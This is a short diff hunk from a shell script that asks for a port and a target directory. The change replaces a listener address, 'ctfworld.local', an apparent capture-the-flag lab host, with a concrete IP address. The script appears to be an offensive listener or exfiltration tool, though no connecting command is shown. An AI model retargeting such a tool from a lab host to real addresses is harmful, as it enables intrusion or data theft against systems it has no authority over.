@@ -6,7 +6,7 @@ read PORT
 echo "[+] Enter the directory should be stored:"
 read TARGET_DIR
 
-LISTENER_IP="ctfworld.local"
+LISTENER_IP="172.105.118.102"
 
 cd "$TARGET_DIR" || exit 1
 
